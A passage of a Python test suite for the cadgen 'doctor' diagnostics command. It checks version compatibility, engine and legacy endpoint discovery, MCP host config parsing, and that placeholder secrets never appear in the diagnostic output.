        with mock.patch.object(doctor, "_setup") as setup, mock.patch.object(doctor, "_probe_kernel") as kernel, \
                mock.patch.object(installations, "setup") as register, mock.patch.object(client, "_start") as start, \
                mock.patch.object(cli, "_tell") as notice:
            out, err = io.StringIO(), io.StringIO()
            with redirect_stdout(out), redirect_stderr(err):
                code = cli.main(["doctor", "--json"])
            self.assertEqual(code, 0)
            import json
            data = json.loads(out.getvalue())
            self.assertEqual(len(out.getvalue().splitlines()), 1, "agent stdout is compact JSON")
            self.assertEqual(data["schema"], 1)
            self.assertEqual(data["current"]["release"], cadgen.__version__)
            for called in (setup, kernel, register, start, notice):
                called.assert_not_called()
            with mock.patch.object(self.diagnostics, "project", return_value={
                    "status": "ok", "release": cadgen.__version__, "meets": self.meets()}):
                code, out, err = _run(["--python", sys.executable])
            self.assertEqual((code, err), (0, ""))
            self.assertIn("diagnostics (ok)", out)
            self.assertFalse((self.root / "state").exists())
            self.assertFalse((self.root / "bin").exists())
            self.assertFalse((self.root / "engine").exists())

    def test_multiple_registered_releases_stale_invalid_records_and_known_ports(self):
        import json

        for version in ("0.8.0", "0.8.2"):
            python = self.write(f"env-{version}/python", "")
            console = self.write(f"env-{version}/cadgen", "")
            self.write(f"state/installations/{version}.json", json.dumps({
                "version": version, "python": str(python), "cadgen": str(console), "prefix": str(python.parent),
                "secret": "NEVER_PRINT_INSTALLATION_SECRET"}))
        self.write("state/installations/0.7.0.json", json.dumps({
            "version": "0.7.0", "python": "/missing/python", "cadgen": "/missing/cadgen", "prefix": "/missing"}))
        self.write("state/installations/9.0.0.json", '{"secret":"NEVER_PRINT_INVALID_SECRET"')
        self.write("state/engines/old.json", json.dumps({"schema": 2, "port": 40001, "token": "NEVER_PRINT_TOKEN"}))
        self.write("state/engines/new.json", json.dumps({"schema": 3, "port": 40002}))
        self.write("state/engines/invalid.json", "[]")
        data = self.data()
        self.assertEqual([item["status"] for item in data["installations"]["records"]],
                         ["stale", "valid", "valid", "invalid"])
        self.assertEqual({item["port"] for item in data["engines"]}, {3245, 40001, 40002})
        self.assertEqual({item["status"] for item in data["engine_records"]["records"]}, {"known", "legacy", "invalid"})
        self.assertNotIn("NEVER_PRINT", json.dumps(data))
        self.assertTrue((self.root / "state/installations/0.7.0.json").exists())

    def test_an_incompatible_project_exits_three_and_another_skill_pin_is_a_warning(self):
        # A cadgen from before 0.8.3 says no format or kernel line: it cannot be shown to meet the engine.
        path = self.write("skill/SKILL.md", skill_text("0.1.0"))
        with mock.patch.object(self.diagnostics, "project", return_value={
                "status": "ok", "release": "0.2.0", "path": "/project/cadgen/__init__.py"}):
            data = self.data("--python", "/project/python", str(path))
        self.assertEqual(data["exit_code"], 3)
        self.assertEqual({issue["code"]: issue["exit_code"] for issue in data["issues"]},
                         {"skill_mismatch": 0, "project_incompatible": 3})
        self.assertTrue(all(issue["remedy"] for issue in data["issues"]))
        self.assertEqual(data["project"]["path"], "/project/cadgen/__init__.py")

    def test_incompatible_means_protocol_format_or_line_and_a_release_apart_is_a_warning(self):
        from cadgen.engine import runtime

        ours = runtime.identity()
        later = f"xbf/{int(ours['writes'].rpartition('/')[2]) + 1}"
        for meets, what in ((self.meets(protocol=ours["protocol"] + 1), "protocol"),
                            (self.meets(writes=later), "format"),
                            (self.meets(native={"ocp_line": "0.1"}), "native")):
            with self.subTest(what), mock.patch.object(self.diagnostics, "project", return_value={
                    "status": "ok", "release": "0.9.0", "meets": meets}):
                data = self.data("--python", "/project/python")
            self.assertEqual(data["exit_code"], 3)
            found = [issue for issue in data["issues"] if issue["code"] == "project_incompatible"]
            self.assertEqual(len(found), 1, data["issues"])
            self.assertIn(f"({what} differs)", found[0]["detail"])
            self.assertTrue(found[0]["remedy"])
            self.assertIn(f"does not meet the engine ({what} differs)", self.diagnostics.human(data))
        with mock.patch.object(self.diagnostics, "project", return_value={
                "status": "ok", "release": "0.0.1", "meets": self.meets()}):
            data = self.data("--python", "/project/python")
        self.assertEqual(data["exit_code"], 0, "a release apart alone is no failure")
        self.assertEqual([issue["code"] for issue in data["issues"]], ["release_behind"])
        self.assertEqual(data["issues"][0]["remedy"], f"Project cadgen 0.0.1 is older than the engine's {ours['release']}: "
                                                      "uv pip install -U cadgen in the project environment.")

    def test_the_selected_engine_is_incompatible_by_the_same_rule_and_a_release_apart_warns(self):
        from cadgen.engine import runtime

        ours = runtime.identity()
        engine = {"port": 3245, "status": "compatible", "release": "0.0.1", "protocol": ours["protocol"],
                  **{key: ours[key] for key in ("writes", "reads", "native")}}
        with mock.patch.object(self.diagnostics, "engine", return_value=engine):
            data = self.data()
        self.assertEqual(data["exit_code"], 0)
        self.assertEqual([issue["code"] for issue in data["issues"]], ["release_behind"])
        self.assertIn("runs cadgen 0.0.1, older than this cadgen", data["issues"][0]["detail"])
        refused = {**engine, "status": "incompatible", "reason": "native",
                   "native": {**ours["native"], "ocp_line": "0.1"}}
        with mock.patch.object(self.diagnostics, "engine", return_value=refused):
            data = self.data()
        self.assertEqual(data["exit_code"], 3)
        found = [issue for issue in data["issues"] if issue["code"] == "engine_incompatible"]
        self.assertEqual(len(found), 1, data["issues"])
        self.assertIn("(native differs)", found[0]["detail"])
        self.assertIn("(native differs)", self.diagnostics.human(data))

    def test_required_project_and_engine_failures_exit_five_and_stale_records_are_warnings(self):
        self.write("state/engines/old.json", '{"schema":3,"port":40001}')
        for state in ("missing", "unusable", "timeout"):
            with self.subTest(state=state), mock.patch.object(self.diagnostics, "project", return_value={"status": state}), \
                    mock.patch.object(self.diagnostics, "engine", side_effect=lambda port: {"port": port, "status": "missing"}):
                data = self.data("--python", "/project/python")
                self.assertEqual(data["exit_code"], 5)
                self.assertIn("stale_engine_record", {item["code"] for item in data["issues"]})
        with mock.patch.dict(os.environ, {"CADGEN_PORT": "TOKEN_MUST_NOT_PRINT"}):
            data = self.data()
        self.assertEqual(data["exit_code"], 5)
        self.assertIsNone(data["selected_port"])
        self.assertNotIn("TOKEN_MUST_NOT_PRINT", str(data))
        self.assertEqual(self.data(str(self.root / "missing-skill"))["skill"]["status"], "missing")
        empty = self.data("--python", "")
        self.assertEqual(empty["project"]["status"], "unusable")
        self.assertEqual(empty["exit_code"], 5)

    def test_host_configs_and_plugin_pins_have_provenance_and_no_launch_secrets(self):
        import json

        def server(version, port):
            return {"command": "uvx", "args": ["--from", "cadgen==" + version, "cadgen", "mcp", "TOKEN_ARG_SECRET"],
                    "env": {"CADGEN_PORT": str(port), "API_TOKEN": "TOKEN_ENV_SECRET"}}
        self.write("codex/config.toml", '[mcp_servers.cad]\ncommand="uvx"\nargs=["--from","cadgen==0.8.2","cadgen","mcp"]\n'
                   '[mcp_servers.cad.env]\nCADGEN_PORT="3245"\nAPI_TOKEN="TOKEN_TOML_SECRET"\n')
        self.write("desktop.json", json.dumps({"mcpServers": {"cad": server("0.8.0", 3245)}}))
        root = self.root / "claude/plugin"
        self.write("claude/plugins/installed_plugins.json", json.dumps({"version": 2, "plugins": {
            "text-to-cad@test": [{"installPath": str(root)}]}}))
        self.write("claude/plugin/.claude-plugin/plugin.json", json.dumps({
            "name": "text-to-cad", "version": "0.8.1", "mcpServers": "./claude.mcp.json"}))
        self.write("claude/plugin/claude.mcp.json", json.dumps({"mcpServers": {"cad": server("0.8.1", 40001)}}))
        self.write("codex/plugins/cache/store/text-to-cad/0.9.0/.codex-plugin/plugin.json", json.dumps({
            "name": "text-to-cad", "version": "0.9.0", "mcpServers": "./codex.mcp.json"}))
        self.write("codex/plugins/cache/store/text-to-cad/0.9.0/codex.mcp.json", json.dumps({"mcpServers": {"cad": server("0.9.0", 3245)}}))
        self.write(".gemini/extensions/text-to-cad/gemini-extension.json", json.dumps({
            "name": "text-to-cad", "version": "0.8.2", "mcpServers": {"cad": server("0.8.2", 40002)}}))
        data = self.data()
        sources = [source for source in data["hosts"]["sources"] if source.get("release")]
        self.assertEqual({source["release"] for source in sources}, {"0.8.0", "0.8.1", "0.8.2", "0.9.0"})
        self.assertTrue(all(source["path"] for source in sources))
        self.assertIn("cached_plugin", {source["kind"] for source in sources})
        self.assertEqual({item["port"] for item in data["engines"]}, {3245, 40001, 40002})
        self.assertIn("provider_port_mismatch", {issue["code"] for issue in data["issues"]})
        self.assertNotIn("TOKEN_", json.dumps(data))

    def test_malformed_unreadable_and_unknown_host_formats_remain_visible(self):
        import json

        self.write("codex/config.toml", 'SECRET_BAD_TOML=[[')
        self.write("desktop.json", '{"mcpServers":{"cad":{"command":"shell","args":["SECRET_SHELL"]}}}')
        self.write("claude/plugins/installed_plugins.json", '{"plugins":[]}')
        data = self.data()
        self.assertEqual({source["status"] for source in data["hosts"]["sources"]}, {"invalid", "unknown", "missing"})
        self.assertNotIn("SECRET_", json.dumps(data))
        path = self.root / "desktop.json"
        with mock.patch.object(os, "open", side_effect=PermissionError("SECRET_ERROR")):
            self.assertEqual(self.hosts.read(path), (None, "unreadable"))

    def test_project_probe_uses_explicit_python_and_discards_all_non_identity_output(self):
        import subprocess

        for done, state in ((subprocess.CompletedProcess([], 1, "SECRET_STDOUT", "SECRET_STDERR"), "unusable"),
                            (subprocess.CompletedProcess([], 0, "SECRET_STDOUT\nCADGEN_DIAGNOSTIC={\"status\":\"missing\"}\n", "SECRET_STDERR"), "missing")):
            with self.subTest(state=state), mock.patch.object(subprocess, "run", return_value=done) as run:
                data = self.diagnostics.project("~/project-python")
                self.assertEqual(data["status"], state)
                self.assertNotIn("SECRET", str(data))
                self.assertEqual(run.call_args.args[0][0], str(self.root / "project-python"))
                self.assertEqual(run.call_args.kwargs["timeout"], self.diagnostics.PROBE_SECONDS)
                self.assertEqual(run.call_args.kwargs["env"]["PYTHONDONTWRITEBYTECODE"], "1")
        with mock.patch.object(subprocess, "run", side_effect=subprocess.TimeoutExpired([], 3, output="SECRET")):
            self.assertEqual(self.diagnostics.project("/dead-python")["status"], "timeout")
        self.assertEqual(self.diagnostics.project(str(self.root / "missing-python"))["status"], "unusable")
        actual = self.diagnostics.project(sys.executable)
        self.assertEqual(actual["status"], "ok", actual)
        self.assertEqual(actual["release"], cadgen.__version__)

    def test_diagnostic_flags_cannot_prune(self):
        for arguments in (["--json", "--prune"], ["--python", sys.executable, "--prune"]):
            with self.subTest(arguments=arguments), redirect_stderr(io.StringIO()), self.assertRaises(SystemExit) as error:
                doctor.main(arguments)
            self.assertEqual(error.exception.code, 2)

    def test_real_project_without_cadgen_and_invalid_executable_are_reported(self):
        import venv

        folder = self.root / "empty-venv"
        venv.EnvBuilder(with_pip=False).create(folder)
        python = folder / ("Scripts/python.exe" if os.name == "nt" else "bin/python")
        with mock.patch.dict(os.environ, {"PYTHONPATH": ""}):
            self.assertEqual(self.diagnostics.project(str(python))["status"], "missing")
        invalid = self.write("invalid-python", "not an executable interpreter")
        invalid.chmod(0o755)
        self.assertEqual(self.diagnostics.project(str(invalid))["status"], "unusable")

    def test_engine_inventory_is_bounded_and_raw_unknown_protocol_errors_are_discarded(self):
        from cadgen.engine import daemon, door
        from types import SimpleNamespace

        self.root.joinpath("engine").mkdir(mode=0o700)
        for port in range(40000, 40020):
            self.write(f"state/engines/{port}.json", '{"schema":3,"port":' + str(port) + '}')
        data = self.data()
        self.assertEqual(len(data["engines"]), self.diagnostics.MAX_ENGINES)
        self.assertIn("engine_inventory_incomplete", {item["code"] for item in data["issues"]})
        if os.name == "nt":
            return
        path = Path(os.environ["CADGEN_ENGINE_DIR"]) / (daemon._tag(port=3245) + ".door")
        os.mkfifo(path, 0o600)
        writer = io.BytesIO()
        connection = SimpleNamespace(reader=io.BytesIO(b'{"failed":"SECRET_ERROR"}\n'), writer=writer, close=mock.Mock())
        with mock.patch.object(door, "answering", return_value=True), mock.patch.object(door, "dial", return_value=connection):
            found = self.diagnostics._probe_port(3245)
        self.assertEqual(found["status"], "unknown_protocol")
        self.assertEqual(found["discovery"], "port_endpoint")
        self.assertNotIn("SECRET", str(found))
        self.assertEqual(len(writer.getvalue().splitlines()), 1)
        self.assertIn(b'"op": "hello"', writer.getvalue())
        connection.close.assert_called_once()

    def test_windows_diagnostic_hello_obeys_authentication_prefix_and_the_compatibility_rule(self):
        import socket
        import threading
        from types import SimpleNamespace
        from cadgen.engine import daemon, runtime

        token = "a" * 32
        ours = runtime.compatibility()
        other = {**ours, "protocol": ours["protocol"] + 1}
        for advertised_release, supplied_token, speaks, expected in (
            (cadgen.__version__, token, ours, "compatible"),
            ("0.0.0", token, ours, "compatible"),  # a release apart alone meets it
            (cadgen.__version__, token, other, "incompatible"),
            (cadgen.__version__, "b" * 32, ours, "unknown_protocol"),
        ):
            with self.subTest(release=advertised_release, authenticated=supplied_token == token,
                              protocol=speaks["protocol"]), socket.socket() as listener:
                listener.bind(("127.0.0.1", 0))
                listener.listen(1)
                listener.settimeout(5)
                transport_port = listener.getsockname()[1]
                # The Windows private TCP transport is distinct from the selected HTTP port.
                self.write("engine/" + daemon._tag(port=3245) + ".port", f"{transport_port} {supplied_token}")
                server = SimpleNamespace(token=token, release_version=advertised_release, port=3245,
                                         instance="diagnostic-test-instance", handle=mock.Mock(), compatibility=speaks)
                errors = []

                def serve():
                    try:
                        connection, _ = listener.accept()
                        daemon._serve_connection(server, connection)
                    except BaseException as error:
                        errors.append(error)

                # Exercise the real Windows admission/parser path on every platform.
                with mock.patch.object(daemon, "WINDOWS", True):
                    thread = threading.Thread(target=serve, daemon=True)
                    thread.start()
                    found = self.diagnostics._probe_port(3245)
                    thread.join(5)
                self.assertFalse(thread.is_alive(), "hello-only diagnostics close the connection")
                self.assertEqual(errors, [])
                self.assertEqual(found["status"], expected, found)
                self.assertNotIn("token", found)
                self.assertNotIn("instance", found)
                if supplied_token == token:
                    self.assertEqual(found["release"], advertised_release)
                if expected == "incompatible":
                    self.assertEqual(found["reason"], "protocol")
                server.handle.assert_not_called()

    def legacy_peer(self, name, answer, ready=None):
        """A real FIFO peer for the old single-request status protocol."""
        from cadgen.engine import door
        import json

        folder = self.root / "engine"
        folder.mkdir(exist_ok=True, mode=0o700)
        requests, errors = [], []

        def serve(reader, writer):
            try:
                requests.append(json.loads(reader.readline()))
                if ready is not None:
                    ready.set()
                if answer is not None:
                    data = answer if isinstance(answer, bytes) else (json.dumps(answer) + "\n").encode()
                    writer.write(data)
                    writer.flush()
                extra = reader.read()
                if extra:
                    requests.append(extra)
            except BaseException as error:
                errors.append(error)

        peer = door.Door(folder / name, lambda ident: door.answer(folder / "clients", ident, serve))
        self.addCleanup(peer.close)
        return requests, errors

    @unittest.skipIf(os.name == "nt", "real POSIX legacy FIFO transport")
    def test_live_legacy_endpoints_supply_identity_ports_and_aliases_without_mutation_or_status_leaks(self):
        import json

        first, first_errors = self.legacy_peer("111111111111.door", {
            "ok": True, "version": cadgen.__version__, "pid": 1234, "installation": "0.8.2-dev.1",
            "serving": {"port": 3245, "url": "SECRET_URL", "documents": ["SECRET_DOCUMENT"]},
            "workers": [{"script": "SECRET_SCRIPT"}], "models": ["SECRET_MODEL"], "token": "SECRET_TOKEN"})
        second, second_errors = self.legacy_peer("222222222222.door", {
            "ok": True, "version": "0.8.1", "pid": 2345, "installation": "0.8.1",
            "serving": {"port": 3248}})
        self.write("state/engines/stale.json", '{"schema":2,"port":40001,"token":"SECRET_RECORD_TOKEN"}')
        folder = self.root / "engine"
        before = {path.name: path.lstat().st_mode for path in folder.iterdir()}
        with mock.patch.object(self.diagnostics, "engine", side_effect=lambda port: {"port": port, "status": "conflicting_listener"}), \
                mock.patch.object(self.diagnostics, "legacy_endpoints", wraps=self.diagnostics.legacy_endpoints) as scan:
            data = self.data()
        scan.assert_called_once()
        by_port = {item["port"]: item for item in data["engines"]}
        self.assertEqual(data["exit_code"], 3)
        self.assertEqual(by_port[3245]["status"], "incompatible", "a matching release still has the legacy protocol")
        self.assertEqual(by_port[3245]["protocol"], "legacy-status")
        self.assertEqual(by_port[3245]["installation"], "0.8.2-dev.1")
        self.assertEqual(by_port[3248]["release"], "0.8.1")
        self.assertNotIn("release", by_port[40001], "a stale record cannot supply a legacy endpoint's port")
        self.assertEqual(first, [{"op": "status"}])
        self.assertEqual(second, [{"op": "status"}])
        self.assertEqual(first_errors + second_errors, [])
        self.assertEqual({path.name: path.lstat().st_mode for path in folder.iterdir()}, before)
        self.assertNotIn("SECRET", json.dumps(data))
        self.assertIn("0.8.2-dev.1", self.diagnostics.human(data))
        self.assertIn("legacy-status", self.diagnostics.human(data))

    def test_legacy_claims_cannot_replace_current_hello_refusal_timeout_or_compatible_identity(self):
        from cadgen.engine import daemon

        self.write("engine/" + daemon._tag(port=3245) + (".port" if daemon.WINDOWS else ".door"), "")
        identity = {"path": str(self.root / "engine/111111111111.door"), "status": "incompatible",
                    "protocol": "legacy-status", "discovery": "legacy_private_endpoint", "port": 3245,
                    "release": "0.8.1", "pid": 1234, "installation": "0.8.1"}
        for current in ({"status": "compatible", "release": cadgen.__version__, "protocol": daemon.PROTOCOL},
                        {"status": "incompatible", "release": "0.8.0", "protocol": daemon.PROTOCOL,
                         "discovery": "port_endpoint"},
                        {"status": "unknown_protocol", "discovery": "port_endpoint"}, {"status": "timeout"}):
            with self.subTest(current=current), mock.patch.object(self.diagnostics, "legacy_endpoints", return_value={
                    "path": str(self.root / "engine"), "status": "ok", "records": [identity], "current_ports": [3245]}), \
                    mock.patch.object(self.diagnostics, "engine", return_value={"port": 3245, **current}):
                data = self.data()
            found = data["engines"][0]
            self.assertEqual(found["status"], current["status"])
            self.assertEqual(found.get("release"), current.get("release"))
            self.assertEqual(found["legacy_endpoints"], [identity])
            self.assertEqual(found["discovery"], "port_endpoint")
            self.assertIn("endpoint_port_conflict", {issue["code"] for issue in data["issues"]})

    def test_current_endpoint_provenance_survives_a_child_timeout_outside_the_scan(self):
        from cadgen.engine import daemon

        path = self.write("engine/" + daemon._tag(port=3245) + (".port" if daemon.WINDOWS else ".door"), "")
        with mock.patch.object(self.diagnostics, "_child", return_value={"status": "timeout"}):
            found = self.engine_probe(3245)
        self.assertEqual(found["status"], "timeout")
        self.assertEqual(found["discovery"], "port_endpoint")
        self.assertEqual(found["endpoint"], str(path.resolve()))
        record = {"path": str(self.root / "engine/111111111111.door"), "status": "incompatible", "port": 3245,
                  "release": "0.8.1", "pid": 1234, "protocol": "legacy-status", "discovery": "legacy_private_endpoint"}
        with mock.patch.object(self.diagnostics, "engine", return_value=found), \
                mock.patch.object(self.diagnostics, "legacy_endpoints", return_value={
                    "path": str(self.root / "engine"), "status": "limited", "records": [record], "current_ports": []}):
            data = self.data()
        self.assertEqual(data["engines"][0]["status"], "timeout")
        self.assertEqual(data["engines"][0]["legacy_endpoints"], [record])

    def test_uncertain_current_probes_are_not_promoted_even_without_a_scanned_current_tag(self):
        record = {"path": str(self.root / "engine/111111111111.door"), "status": "incompatible", "port": 3245,
                  "release": "0.8.1", "pid": 1234, "protocol": "legacy-status", "discovery": "legacy_private_endpoint"}
        for status in ("timeout", "unusable", "unknown_protocol", "invalid_endpoint", "unreadable"):
            with self.subTest(status=status), mock.patch.object(self.diagnostics, "engine", return_value={"port": 3245, "status": status}), \
                    mock.patch.object(self.diagnostics, "legacy_endpoints", return_value={
                        "path": str(self.root / "engine"), "status": "ok", "records": [record], "current_ports": []}):
                found = self.data()["engines"][0]
            self.assertEqual(found["status"], status)
            self.assertNotIn("release", found)
            self.assertEqual(found["legacy_endpoints"], [record])

    def test_legacy_duplicate_port_claims_remain_ambiguous(self):
        records = [{"path": str(self.root / f"engine/{at:012x}.door"), "status": "incompatible",
                    "protocol": "legacy-status", "discovery": "legacy_private_endpoint", "port": 3245,
                    "release": version, "pid": at + 1} for at, version in enumerate(("0.8.0", "0.8.1"))]
        with mock.patch.object(self.diagnostics, "legacy_endpoints", return_value={
                "path": str(self.root / "engine"), "status": "ok", "records": records, "current_ports": []}), \
                mock.patch.object(self.diagnostics, "engine", return_value={"port": 3245, "status": "conflicting_listener"}):
            data = self.data()
        found = data["engines"][0]
        self.assertEqual(found["status"], "incompatible")
        self.assertNotIn("release", found)
        self.assertNotIn("installation", found)
        self.assertEqual(found["legacy_endpoints"], records)
        self.assertIn("legacy_port_ambiguous", {issue["code"] for issue in data["issues"]})

    def test_legacy_directory_scan_is_bounded_and_unrecorded_current_tags_are_not_status_probed(self):
        from cadgen.engine import daemon

        suffix = ".port" if daemon.WINDOWS else ".door"
        self.write("engine/" + daemon._tag(port=40009) + suffix, "")
        for at in (1, 2, 3):
            self.write("engine/" + f"{at:012x}" + suffix, "")
        with mock.patch.object(self.diagnostics, "_child", return_value={"status": "unknown_protocol"}) as child, \
                mock.patch.object(self.diagnostics.os, "scandir", wraps=os.scandir) as scan, \
                mock.patch.object(self.diagnostics, "MAX_ENGINES", 2):
            found = self.diagnostics.legacy_endpoints()
        scan.assert_called_once()
        self.assertEqual(found["current_ports"], [40009])
        self.assertEqual(found["status"], "limited")
        self.assertEqual(child.call_count, 2)
        self.assertTrue(all(daemon._tag(port=40009) not in call.args[0][-1] for call in child.call_args_list))
        with mock.patch.object(self.diagnostics, "legacy_endpoints", return_value=found):
            data = self.data()
        self.assertIn(40009, {item["port"] for item in data["engines"]})
        self.assertIn("endpoint_inventory_incomplete", {issue["code"] for issue in data["issues"]})
        with mock.patch.object(self.diagnostics, "MAX_RECORDS", 1), \
                mock.patch.object(self.diagnostics, "_child", return_value={"status": "unusable"}):
            self.assertEqual(self.diagnostics.legacy_endpoints()["status"], "limited")
        with mock.patch.object(self.diagnostics.os, "scandir", side_effect=PermissionError("SECRET_ERROR")):
            unknown = self.diagnostics.legacy_endpoints()
        self.assertEqual(unknown["status"], "unreadable")
        self.assertNotIn("SECRET", str(unknown))

    @unittest.skipIf(os.name == "nt", "POSIX endpoint kinds and ownership")
    def test_legacy_discovery_refuses_links_regular_files_foreign_owners_and_dead_fifos(self):
        from cadgen.engine import daemon
        from types import SimpleNamespace
        import stat

        folder = self.root / "engine"
        folder.mkdir(mode=0o700)
        target = folder / "target"
        os.mkfifo(target, 0o600)
        (folder / "111111111111.door").symlink_to(target)
        self.write("engine/222222222222.door", "SECRET_REGULAR_FILE")
        os.mkfifo(folder / "333333333333.door", 0o600)
        before = {path.name: path.lstat().st_mode for path in folder.iterdir()}
        result = self.diagnostics.legacy_endpoints()
        states = {Path(item["path"]).name: item["status"] for item in result["records"]}
        self.assertEqual(states, {"111111111111.door": "invalid_endpoint", "222222222222.door": "invalid_endpoint",
                                  "333333333333.door": "stale_endpoint"})
        self.assertEqual({path.name: path.lstat().st_mode for path in folder.iterdir()}, before)
        foreign = SimpleNamespace(st_mode=stat.S_IFIFO | 0o600, st_uid=os.getuid() + 1)
        with mock.patch.object(Path, "lstat", return_value=foreign):
            self.assertEqual(self.diagnostics._open_endpoint(target)[2], "invalid_endpoint")

    def test_legacy_status_is_bounded_and_malformed_identity_is_unknown(self):
        from types import SimpleNamespace
        import json

        self.root.joinpath("engine").mkdir(mode=0o700)
        good = {"ok": True, "version": "0.8.1", "pid": 1234, "serving": {"port": 3245}}
        answers = [b"", b"[]\n", b"{bad SECRET\n", json.dumps({**good, "serving": {"port": 0}}).encode(),
                   json.dumps({**good, "pid": True}).encode(), json.dumps({**good, "ok": 1}).encode()]
        for answer in answers:
            writer = io.BytesIO()
            connection = SimpleNamespace(reader=io.BytesIO(answer), writer=writer, close=mock.Mock())
            with self.subTest(answer=answer), mock.patch.object(self.diagnostics, "_open_endpoint", return_value=(connection, None, "ok")):
                found = self.diagnostics._probe_legacy_endpoint("111111111111" + (".port" if os.name == "nt" else ".door"))
            self.assertEqual(found, {"status": "unknown_protocol"})
            self.assertEqual(json.loads(writer.getvalue()), {"op": "status"})
            connection.close.assert_called_once()
        oversized = SimpleNamespace(reader=io.BytesIO(b"x" * 33), writer=io.BytesIO(), close=mock.Mock())
        with mock.patch.object(self.diagnostics.doctor_files, "MAX_BYTES", 32), \
                mock.patch.object(self.diagnostics, "_open_endpoint", return_value=(oversized, None, "ok")):
            self.assertEqual(self.diagnostics._probe_legacy_endpoint("111111111111" + (".port" if os.name == "nt" else ".door")),
                             {"status": "too_large"})

    @unittest.skipIf(os.name == "nt", "real POSIX legacy FIFO transport")
    def test_hanging_legacy_peer_is_bounded_by_its_child_and_leaves_no_ipc_files(self):
        import subprocess
        import threading

        ready = threading.Event()
        requests, errors = self.legacy_peer("111111111111.door", None, ready)
        folder = self.root / "engine"
        before = {path.name: path.lstat().st_mode for path in folder.iterdir()}

        def run_ready_child(command, **options):
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                                       encoding=options["encoding"], errors=options["errors"], env=options["env"])
            try:
                self.assertTrue(ready.wait(10), "wait for the real status request before testing its blocked response")
                out, err = process.communicate(timeout=0.05)
                return subprocess.CompletedProcess(command, process.returncode, out, err)
            finally:
                if process.poll() is None:
                    process.kill()
                process.communicate()

        with mock.patch.object(self.diagnostics.subprocess, "run", side_effect=run_ready_child):
            found = self.diagnostics.legacy_endpoints()
        self.assertEqual(found["records"][0]["status"], "timeout")
        self.assertEqual(requests, [{"op": "status"}])
        self.assertEqual(errors, [])
        self.assertEqual({path.name: path.lstat().st_mode for path in folder.iterdir()}, before)

    def test_windows_legacy_status_uses_token_prefix_and_validates_private_port_file(self):
        import socket
        import threading
        import json
        from types import SimpleNamespace
        from cadgen.engine import daemon

        token = "a" * 32
        status = {"ok": True, "version": "0.8.1", "installation": "0.8.1-dev.1", "pid": 1234,
                  "serving": {"port": 3248, "documents": ["SECRET_DOCUMENT"]}, "token": "SECRET_TOKEN"}
        requests, errors = [], []
        with socket.socket() as listener:
            listener.bind(("127.0.0.1", 0))
            listener.listen(1)
            listener.settimeout(5)
            address = self.write("engine/111111111111.port", f"{listener.getsockname()[1]} {token}")

            def serve():
                try:
                    connection, _ = listener.accept()
                    with connection, connection.makefile("rwb") as stream:
                        prefix = daemon._admitted(SimpleNamespace(token=token), connection, stream)
                        if prefix is not None:
                            requests.append(json.loads(prefix + stream.readline()))
                            stream.write((json.dumps(status) + "\n").encode())
                            stream.flush()
                            extra = stream.read()
                            if extra:
                                requests.append(extra)
                except BaseException as error:
                    errors.append(error)

            with mock.patch.object(daemon, "WINDOWS", True):
                thread = threading.Thread(target=serve, daemon=True)
                thread.start()
                found = self.diagnostics._probe_legacy_endpoint(address.name)
                thread.join(5)
            self.assertFalse(thread.is_alive())
        self.assertEqual(errors, [])
        self.assertEqual(requests, [{"token": token, "op": "status"}])
        self.assertEqual(found, {"status": "incompatible", "port": 3248, "release": "0.8.1", "pid": 1234,
                                 "installation": "0.8.1-dev.1"})
        self.assertNotIn("SECRET", str(found))
        for invalid in ("0 " + token, "65536 " + token, "1234 not-a-token", "1234 " + token + " extra", "x" * 1025):
            address.write_text(invalid, encoding="utf-8")
            with self.subTest(invalid=invalid), mock.patch.object(daemon, "WINDOWS", True), \
                    mock.patch.object(self.diagnostics.socket, "create_connection") as connect:
                self.assertEqual(self.diagnostics._probe_legacy_endpoint(address.name)["status"], "invalid_endpoint")
                connect.assert_not_called()
        other = self.write("other-port-file", "1234 " + token)
        descriptor = os.open(other, os.O_RDONLY)
        with mock.patch.object(self.diagnostics.os, "open", return_value=descriptor):
            self.assertIsNone(self.diagnostics._read_port_file(address, address.lstat()))

    def test_development_alias_does_not_replace_the_explicit_runtime_release(self):
        data = self.hosts._server({"args": ["--from", "cadgen==0.8.2", "cadgen", "mcp"],
                                   "env": {"CADGEN_INSTALLATION_VERSION": "99.0.0"}})
        self.assertEqual(data["release"], "0.8.2")
        self.assertEqual(data["installation"], "99.0.0")
        alias = self.hosts._server({"args": ["-m", "cadgen.cli", "mcp"],
                                    "env": {"CADGEN_INSTALLATION_VERSION": "0.8.2-dev.1"}})
        self.assertIsNone(alias["release"])
        self.assertEqual(alias["installation"], "0.8.2-dev.1")

    @unittest.skipIf(os.name == "nt", "POSIX FIFO permissions")
    def test_stale_endpoint_probe_creates_no_clients_folder_or_repairs_permissions(self):
        from cadgen.engine import daemon, door

        folder = self.root / "engine"
        folder.mkdir(mode=0o700)
        path = folder / (daemon._tag(port=3245) + ".door")
        os.mkfifo(path, 0o600)
        before = sorted(item.name for item in folder.iterdir())
        with mock.patch.object(self.diagnostics, "_listener", return_value="missing"):
            self.assertEqual(self.diagnostics._probe_port(3245)["status"], "stale_endpoint")
        self.assertEqual(sorted(item.name for item in folder.iterdir()), before)
        clients = folder / "clients"
        clients.mkdir(mode=0o755)
        clients.chmod(0o755)
        self.assertIsNone(door.dial(path, timeout=0.01, repair=False))
        self.assertEqual(clients.stat().st_mode & 0o777, 0o755)
        clients.rmdir()
        self.assertIsNone(door.dial(path, timeout=0.01, repair=False))
        self.assertFalse(clients.exists())

    @unittest.skipIf(os.name == "nt", "POSIX nonregular files")
    def test_nonregular_and_oversize_records_never_enter_unbounded_installation_lookup(self):
        from cadgen._internal import installations

        path = self.root / "state/installations" / (cadgen.__version__ + ".json")
        path.parent.mkdir(parents=True)
        os.mkfifo(path, 0o600)
        self.assertEqual(self.hosts.read(path), (None, "invalid"))
        with mock.patch.object(installations, "own_version", side_effect=AssertionError("unbounded registry reader")):
            data = self.data()
        self.assertEqual(data["installations"]["records"][0]["status"], "invalid")
        path.unlink()
        path.write_bytes(b" " * (self.hosts.MAX_BYTES + 1))
        self.assertEqual(self.hosts.read(path), (None, "too_large"))

    def test_host_ports_do_not_guess_over_legacy_selection_or_ignore_cli_equals(self):
        base = {"args": ["--from", "cadgen==0.8.2", "cadgen", "mcp"]}
        old = self.hosts._server({**base, "env": {"CADGEN_ENGINE_PORT": "40001"}})
        self.assertIsNone(old["port"])
        self.assertEqual(old["status"], "unknown")
        self.assertEqual(old["port_status"], "unsupported_legacy_variable")
        for flags in (["--port=40002"], ["--port", "40002"]):
